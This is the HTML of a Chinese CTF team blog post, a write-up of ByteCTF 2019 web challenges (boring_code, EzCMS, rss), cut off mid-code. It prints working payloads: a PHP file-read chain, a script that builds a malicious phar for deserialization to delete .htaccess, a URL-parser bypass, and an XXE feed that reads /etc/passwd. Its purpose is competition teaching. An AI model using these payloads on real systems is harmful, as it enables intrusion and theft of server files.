<!doctype html>
<html lang="en"><head><meta charset="utf-8"><meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"><meta><title>ByteCTF 2019 SU Write Up - su-team</title><link rel="manifest" href="/manifest.json"><meta name="application-name" content="su-team"><meta name="msapplication-TileImage" content="/img/SU4.jpg"><meta name="apple-mobile-web-app-capable" content="yes"><meta name="apple-mobile-web-app-title" content="su-team"><meta name="apple-mobile-web-app-status-bar-style" content="default"><meta name="description" content="以下是我们 SU 本次 ByteCTF的 writeup。"><meta property="og:type" content="blog"><meta property="og:title" content="ByteCTF 2019 SU Write Up"><meta property="og:url" content="https://team-su.github.io/2019/09/14/2019-09-07-ByteCTF/"><meta property="og:site_name" content="su-team"><meta property="og:description" content="以下是我们 SU 本次 ByteCTF的 writeup。"><meta property="og:locale" content="en_US"><meta property="og:image" content="https://hackmd.summershrimp.com/uploads/upload_f47c3d040ed16a129a345190d1caa97d.png"><meta property="og:image" content="https://hackmd.summershrimp.com/uploads/upload_e098d7bf802d700acd98ac57755507e7.png"><meta property="article:published_time" content="2019-09-14T09:30:50.000Z"><meta property="article:modified_time" content="2025-06-09T03:20:25.224Z"><meta property="article:author" content="SUers"><meta property="article:tag" content="ByteCTF"><meta property="twitter:card" content="summary"><meta property="twitter:image:src" content="https://hackmd.summershrimp.com/uploads/upload_f47c3d040ed16a129a345190d1caa97d.png"><script type="application/ld+json">{"@context":"https://schema.org","@type":"BlogPosting","mainEntityOfPage":{"@type":"WebPage","@id":"https://team-su.github.io/2019/09/14/2019-09-07-ByteCTF/"},"headline":"ByteCTF 2019 SU Write Up","image":["https://hackmd.summershrimp.com/uploads/upload_f47c3d040ed16a129a345190d1caa97d.png","https://hackmd.summershrimp.com/uploads/upload_e098d7bf802d700acd98ac57755507e7.png"],"datePublished":"2019-09-14T09:30:50.000Z","dateModified":"2025-06-09T03:20:25.224Z","author":{"@type":"Person","name":"SUers"},"publisher":{"@type":"Organization","name":"su-team","logo":{"@type":"ImageObject","url":"https://team-su.github.io/img/SU4.jpg"}},"description":"以下是我们 SU 本次 ByteCTF的 writeup。"}</script><link rel="canonical" href="https://team-su.github.io/2019/09/14/2019-09-07-ByteCTF/"><link rel="alternate" href="/atom.xml" title="su-team" type="application/atom+xml"><link rel="icon" href="/img/SU4.jpg"><link rel="stylesheet" href="https://use.fontawesome.com/releases/v6.0.0/css/all.css"><link data-pjax rel="stylesheet" href="https://cdn.jsdelivr.net/npm/highlight.js@11.7.0/styles/atom-one-light.css"><link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Ubuntu:wght@400;600&amp;family=Source+Code+Pro"><link data-pjax rel="stylesheet" href="/css/default.css"><style>body>.footer,body>.navbar,body>.section{opacity:0}</style><!--!--><!--!--><!--!--><!--!--><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/cookieconsent@3.1.1/build/cookieconsent.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/lightgallery@1.10.0/dist/css/lightgallery.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/justifiedGallery@3.8.1/dist/css/justifiedGallery.min.css"><!--!--><!--!--><!--!--><style>.pace{-webkit-pointer-events:none;pointer-events:none;-webkit-user-select:none;-moz-user-select:none;user-select:none}.pace-inactive{display:none}.pace .pace-progress{background:#3273dc;position:fixed;z-index:2000;top:0;right:100%;width:100%;height:2px}</style><script src="https://cdn.jsdelivr.net/npm/pace-js@1.2.4/pace.min.js"></script><!--!--><!--!--><!-- hexo injector head_end start --><script>
  (function () {
      function switchTab() {
          if (!location.hash) {
            return;
          }

          const id = '#' + CSS.escape(location.hash.substring(1));
          const $tabMenu = document.querySelector(`.tabs a[href="${id}"]`);
          if (!$tabMenu) {
            return;
          }

          const $tabMenuContainer = $tabMenu.parentElement.parentElement;
          Array.from($tabMenuContainer.children).forEach($menu => $menu.classList.remove('is-active'));
          Array.from($tabMenuContainer.querySelectorAll('a'))
              .map($menu => document.getElementById($menu.getAttribute("href").substring(1)))
              .forEach($content => $content.classList.add('is-hidden'));

          if ($tabMenu) {
              $tabMenu.parentElement.classList.add('is-active');
          }
          const $activeTab = document.querySelector(id);
          if ($activeTab) {
              $activeTab.classList.remove('is-hidden');
          }
      }
      switchTab();
      window.addEventListener('hashchange', switchTab, false);
  })();
  </script><!-- hexo injector head_end end --><meta name="generator" content="Hexo 7.3.0"></head><body class="is-1-column"><nav class="navbar navbar-main"><div class="container navbar-container"><div class="navbar-brand justify-content-center"><a class="navbar-item navbar-logo" href="/"><img src="/img/SU4.jpg" alt="su-team" height="28"></a></div><div class="navbar-menu"><div class="navbar-start"><a class="navbar-item" href="/">Home</a><a class="navbar-item" href="/archives">Archives</a><a class="navbar-item" href="/tags">Tags</a><a class="navbar-item" href="/about">About</a><a class="navbar-item" href="/members">Members</a></div><div class="navbar-end"><a class="navbar-item" target="_blank" rel="noopener" title="Download on GitHub" href="https://github.com/team-su"><i class="fab fa-github"></i></a><a class="navbar-item" target="_blank" rel="noopener" title="RSS Feed" href="/atom.xml"><i class="fas fa-rss"></i></a><a class="navbar-item search" title="Search" href="javascript:;"><i class="fas fa-search"></i></a></div></div></div></nav><section class="section"><div class="container"><div class="columns"><div class="column order-2 column-main is-12"><div class="card"><article class="card-content article" role="article"><div class="article-meta is-size-7 is-uppercase level is-mobile"><div class="level-left"><span class="level-item">Posted&nbsp;<time dateTime="2019-09-14T09:30:50.000Z" title="2019/9/14 17:30:50">2019-09-14</time></span><span class="level-item">Updated&nbsp;<time dateTime="2025-06-09T03:20:25.224Z" title="2025/6/9 11:20:25">2025-06-09</time></span><span class="level-item">21 minutes read (About 3200 words)</span></div></div><h1 class="title is-3 is-size-4-mobile">ByteCTF 2019 SU Write Up</h1><div class="content"><p>以下是我们 SU 本次 ByteCTF的 writeup。</p>
<span id="more"></span>

<hr>
<p>以下是我们 SU 本次 ByteCTF的 writeup。</p>
<div class="toc">

<!-- toc -->

<ul>
<li><a href="#web">Web</a><ul>
<li><a href="#boring-code">boring_code</a></li>
<li><a href="#ezcms">EzCMS</a></li>
<li><a href="#rss">rss</a></li>
</ul>
</li>
<li><a href="#pwn">Pwn</a><ul>
<li><a href="#note-five">note_five</a></li>
<li><a href="#vip">vip</a></li>
<li><a href="#mheap">mheap</a></li>
<li><a href="#mulnote">mulnote</a></li>
<li><a href="#childjs">childjs</a></li>
</ul>
</li>
<li><a href="#misc">Misc</a><ul>
<li><a href="#jigsaw">jigsaw</a></li>
<li><a href="#betgame">betgame</a></li>
</ul>
</li>
<li><a href="#crypto">Crypto</a><ul>
<li><a href="#lrlr">lrlr</a></li>
</ul>
</li>
</ul>
<!-- tocstop -->

</div>

<h2><span id="web">Web</span><a href="#web" class="header-anchor"></a></h2><h3><span id="boring-code">boring_code</span><a href="#boring-code" class="header-anchor"></a></h3><p>买了一个<code>aaaasdbaidu.com</code>的域名，即可绕过前面的 url 限制。<del>没错有钱你就可以打 CTF</del><br>然后在服务器上放<code>payload</code>就行了</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">readfile</span>(<span class="title function_ invoke__">end</span>(<span class="title function_ invoke__">scandir</span>(<span class="title function_ invoke__">chr</span>(<span class="title function_ invoke__">microtime</span>(<span class="title function_ invoke__">chdir</span>(<span class="title function_ invoke__">next</span>(<span class="title function_ invoke__">scandir</span>(<span class="title function_ invoke__">chr</span>(<span class="title function_ invoke__">time</span>())))))))));</span><br></pre></td></tr></table></figure>
<p>dns 好了就直接爆破等时间就行了</p>
<h3><span id="ezcms">EzCMS</span><a href="#ezcms" class="header-anchor"></a></h3><p>竟然抄了一下我们 suctf 的题…<br>前面有一个 hash 长度拓展攻击，有原题，只不过长度为8位，hashdump跑一下就行了。<br>题目意图非常明显，跟 SUCTF upload labs 2 差不多，php phar 反序列化触发函数是<code>mime_content_type</code>，使用<code>php://filter/read=convert.base64-encode/resource=</code>绕过正则限制，加一个 <code>ZipArchive-&gt;open</code> 删除 <code>.htaccess</code>就行了<br><a href="https://www.anquanke.com/post/id/95896">Insomni’hack Teaser 2018比赛Write Up：File Vault题目</a><br>然后随便上传一个 php 文件，删掉<code>.htaccess</code>之后就直接<br>构造 phar 的代码：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Check</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$filename</span>;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$filename</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;filename = <span class="variable">$filename</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">File</span></span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$filename</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$filepath</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$checker</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Admin</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$size</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$checker</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$file_tmp</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$filename</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$upload_dir</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$content_check</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Profile</span></span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$username</span> = <span class="string">&quot;/var/www/html/sandbox/9607fe6aa978f6811eb3fe830b544771/.htaccess&quot;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$password</span> = <span class="string">&quot;9&quot;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$admin</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">A</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$a</span> = <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">unlink</span>(<span class="string">&quot;1.phar&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="variable">$phar</span> = <span class="keyword">new</span> <span class="title class_">Phar</span>(<span class="string">&quot;1.phar&quot;</span>); <span class="comment">//后缀名必须为phar</span></span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">startBuffering</span>();</span><br><span class="line"><span class="comment">// &lt;?php __HALT_COMPILER();</span></span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">setStub</span>(<span class="string">&quot;GIF89a&quot;</span> . <span class="string">&quot;&lt;?php __HALT_COMPILER(); ?&gt;&quot;</span>); <span class="comment">//设置stub</span></span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> <span class="title class_">ZipArchive</span>();</span><br><span class="line"><span class="variable">$b</span> = <span class="keyword">new</span> <span class="title class_">Profile</span>();</span><br><span class="line"><span class="variable">$b</span>-&gt;admin = <span class="variable">$a</span>;</span><br><span class="line"><span class="variable">$o</span> = <span class="keyword">new</span> <span class="title class_">File</span>();</span><br><span class="line"><span class="variable">$o</span>-&gt;checker = <span class="variable">$b</span>;</span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">setMetadata</span>(<span class="variable">$o</span>); <span class="comment">//将自定义的meta-data存入manifest</span></span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">addFromString</span>(<span class="string">&quot;test.txt&quot;</span>, <span class="string">&quot;test&quot;</span>); </span><br><span class="line">    <span class="comment">//签名自动计算</span></span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">stopBuffering</span>();</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<h3><span id="rss">rss</span><a href="#rss" class="header-anchor"></a></h3><p><code>http://122.112.199.14:80,baidu.com:80/file</code> 逗号绕过 <code>url_parse</code>，vps 上放 xml ，可以任意读</p>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;utf-8&quot;</span>?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">title</span> [ <span class="meta">&lt;!ELEMENT <span class="keyword">title</span> <span class="keyword">ANY</span> &gt;</span></span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ENTITY <span class="keyword">xxe</span> <span class="keyword">SYSTEM</span> <span class="string">&quot;file:///etc/passwd&quot;</span> &gt;</span>]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">rss</span> <span class="attr">version</span>=<span class="string">&quot;2.0&quot;</span> </span></span><br><span class="line"><span class="tag">    <span class="attr">xmlns:atom</span>=<span class="string">&quot;http://www.w3.org/2005/Atom&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">channel</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">title</span>&gt;</span>先知安全技术社区<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">link</span>&gt;</span>http://xz.aliyun.com/forum/<span class="tag">&lt;/<span class="name">link</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">description</span>&gt;</span>先知安全技术社区<span class="tag">&lt;/<span class="name">description</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">atom:link</span> <span class="attr">href</span>=<span class="string">&quot;http://xz.aliyun.com/forum/feed/&quot;</span> <span class="attr">rel</span>=<span class="string">&quot;self&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">atom:link</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">language</span>&gt;</span>zh-hans<span class="tag">&lt;/<span class="name">language</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">lastBuildDate</span>&gt;</span>Sun, 08 Sep 2019 10:15:41 +0800<span class="tag">&lt;/<span class="name">lastBuildDate</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">item</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">title</span>&gt;</span><span class="symbol">&amp;xxe;</span><span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">link</span>&gt;</span>http://xz.aliyun.com/t/6223<span class="tag">&lt;/<span class="name">link</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">description</span>&gt;</span>CVE-2018-14418 擦出新火花<span class="tag">&lt;/<span class="name">description</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">pubDate</span>&gt;</span>Sun, 08 Sep 2019 10:15:41 +0800<span class="tag">&lt;/<span class="name">pubDate</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">guid</span>&gt;</span>http://xz.aliyun.com/t/6223<span class="tag">&lt;/<span class="name">guid</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">item</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">channel</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">rss</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p>php 伪协议读源码<br>index.php</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">ini_set</span>(<span class="string">&#x27;display_errors&#x27;</span>,<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">ini_set</span>(<span class="string">&#x27;display_startup_erros&#x27;</span>,<span class="number">1</span>);</span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(E_ALL);</span><br><span class="line"><span class="keyword">require_once</span>(<span class="string">&#x27;routes.php&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">__autoload</span>(<span class="params"><span class="variable">$class_name</span></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">file_exists</span>(<span class="string">&#x27;./classes/&#x27;</span>.<span class="variable">$class_name</span>.<span class="string">&#x27;.php&#x27;</span>)) &#123;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">require_once</span> <span class="string">&#x27;./classes/&#x27;</span>.<span class="variable">$class_name</span>.<span class="string">&#x27;.php&#x27;</span>;</span><br><span class="line"></span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span>(<span class="title function_ invoke__">file_exists</span>(<span class="string">&#x27;./controllers/&#x27;</span>.<span class="variable">$class_name</span>.<span class="string">&#x27;.php&#x27;</span>)) &#123;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">require_once</span> <span class="string">&#x27;./controllers/&#x27;</span>.<span class="variable">$class_name</span>.<span class="string">&#x27;.php&#x27;</span>;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>routes.php</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="title class_">Route</span>::<span class="title function_ invoke__">set</span>(<span class="string">&#x27;index.php&#x27;</span>,function()&#123;</span><br><span class="line">    <span class="title class_">Index</span>::<span class="title function_ invoke__">createView</span>(<span class="string">&#x27;Index&#x27;</span>);</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line"><span class="title class_">Route</span>::<span class="title function_ invoke__">set</span>(<span class="string">&#x27;index&#x27;</span>,function()&#123;</span><br><span class="line">    <span class="title class_">Index</span>::<span class="title function_ invoke__">createView</span>(<span class="string">&#x27;Index&#x27;</span>);</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line"><span class="title class_">Route</span>::<span class="title function_ invoke__">set</span>(<span class="string">&#x27;fetch&#x27;</span>,function()&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_REQUEST</span>[<span class="string">&#x27;rss_url&#x27;</span>]))&#123;</span><br><span class="line">        <span class="title class_">Fetch</span>::<span class="title function_ invoke__">handleUrl</span>(<span class="variable">$_REQUEST</span>[<span class="string">&#x27;rss_url&#x27;</span>]);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line"><span class="title class_">Route</span>::<span class="title function_ invoke__">set</span>(<span class="string">&#x27;rss_in_order&#x27;</span>,function()&#123;</span><br><span class="line">    <span class="keyword">if</span>(!<span class="keyword">isset</span>(<span class="variable">$_REQUEST</span>[<span class="string">&#x27;rss_url&#x27;</span>]) &amp;&amp; !<span class="keyword">isset</span>(<span class="variable">$_REQUEST</span>[<span class="string">&#x27;order&#x27;</span>]))&#123;</span><br><span class="line">        <span class="title class_">Admin</span>::<span class="title function_ invoke__">createView</span>(<span class="string">&#x27;Admin&#x27;</span>);</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">      <span class="keyword">if</span>(<span class="variable">$_SERVER</span>[<span class="string">&#x27;REMOTE_ADDR&#x27;</span>] == <span class="string">&#x27;127.0.0.1&#x27;</span> || <span class="variable">$_SERVER</span>[<span class="string">&#x27;REMOTE_ADDR&#x27;</span>] == <span class="string">&#x27;::1&#x27;</span>)&#123;</span><br><span class="line">        <span class="title class_">Admin</span>::<span class="title function_ invoke__">sort</span>(<span class="variable">$_REQUEST</span>[<span class="string">&#x27;rss_url&#x27;</span>],<span class="variable">$_REQUEST</span>[<span class="string">&#x27;order&#x27;</span>]);</span><br><span class="line">      &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">       <span class="keyword">echo</span> <span class="string">&quot;;(&quot;</span>;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>

<p>Admin.php</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Admin</span> <span class="keyword">extends</span> <span class="title">Controller</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="built_in">static</span> <span class="function"><span class="keyword">function</span> <span class="title">sort</span>(<span class="params"><span class="variable">$url</span>,<span class="variable">$order</span></span>)</span>&#123;</span><br><span class="line">        <span class="variable">$rss</span>=<span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$url</span>);</span><br><span class="line">        <span class="variable">$rss</span>=<span class="title function_ invoke__">simplexml_load_string</span>(<span class="variable">$rss</span>,<span class="string">&#x27;SimpleXMLElement&#x27;</span>, LIBXML_NOENT);</span><br><span class="line">        <span class="keyword">require_once</span> <span class="string">&#x27;./views/Admin.php&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>Fetch.php</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Fetch</span> <span class="keyword">extends</span> <span class="title">Controller</span></span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="built_in">static</span> <span class="function"><span class="keyword">function</span> <span class="title">handleUrl</span>(<span class="params"><span class="variable">$url</span></span>) </span>&#123;</span><br><span class="line">        <span class="variable">$r</span> = <span class="title function_ invoke__">parse_url</span>(<span class="variable">$url</span>);</span><br><span class="line">        <span class="variable">$invalidUrl</span> = <span class="literal">false</span>;</span><br><span class="line">	<span class="keyword">if</span> (<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/aliyun\.com$/&#x27;</span>, <span class="variable">$r</span>[<span class="string">&#x27;host&#x27;</span>]) || <span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/baidu\.com$/&#x27;</span>, <span class="variable">$r</span>[<span class="string">&#x27;host&#x27;</span>]) || <span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/qq\.com$/&#x27;</span>, <span class="variable">$r</span>[<span class="string">&#x27;host&#x27;</span>])) &#123; </span><br><span class="line">            <span class="variable">$rss</span> = <span class="title class_">Rss</span>::<span class="title function_ invoke__">fetch</span>(<span class="variable">$url</span>);</span><br><span class="line">        &#125;<span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="variable">$invalidUrl</span> = <span class="literal">true</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">require_once</span> <span class="string">&#x27;./views/Fetch.php&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>Rss.php</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Rss</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="built_in">static</span> <span class="function"><span class="keyword">function</span> <span class="title">curl_request</span>(<span class="params"><span class="variable">$url</span>, <span class="variable">$post</span> = <span class="string">&#x27;&#x27;</span>, <span class="variable">$cookie</span> = <span class="string">&#x27;&#x27;</span>, <span class="variable">$headers</span> = <span class="string">&#x27;&#x27;</span>, <span class="variable">$returnHeader</span> = <span class="number">0</span></span>) </span>&#123;</span><br><span class="line">        <span class="variable">$curl</span> = <span class="title function_ invoke__">curl_init</span>();</span><br><span class="line">        <span class="title function_ invoke__">curl_setopt</span>(<span class="variable">$curl</span>, CURLOPT_URL, <span class="variable">$url</span>);</span><br><span class="line">        <span class="title function_ invoke__">curl_setopt</span>(<span class="variable">$curl</span>, CURLOPT_USERAGENT, <span class="string">&#x27;Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.1; Trident/6.0)&#x27;</span>);</span><br><span class="line">        <span class="title function_ invoke__">curl_setopt</span>(<span class="variable">$curl</span>, CURLOPT_FOLLOWLOCATION, <span class="number">1</span>);</span><br><span class="line">        <span class="title function_ invoke__">curl_setopt</span>(<span class="variable">$curl</span>, CURLOPT_AUTOREFERER, <span class="number">1</span>);</span><br><span class="line">        <span class="title function_ invoke__">curl_setopt</span>(<span class="variable">$curl</span>, CURLOPT_REFERER, <span class="variable">$url</span>);</span><br><span class="line">        <span class="title function_ invoke__">curl_setopt</span>(<span class="variable">$curl</span>, CURLOPT_SSL_VERIFYPEER, <span class="literal">false</span>);</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable">$post</span>) &#123;</span><br><span class="line">            <span class="title function_ invoke__">curl_setopt</span>(<span class="variable">$curl</span>, CURLOPT_POST, <span class="number">1</span>);</span><br><span class="line">            <span class="title function_ invoke__">curl_setopt</span>(<span class="variable">$curl</span>, CURLOPT_POSTFIELDS, <span class="title function_ invoke__">http_build_query</span>(<span 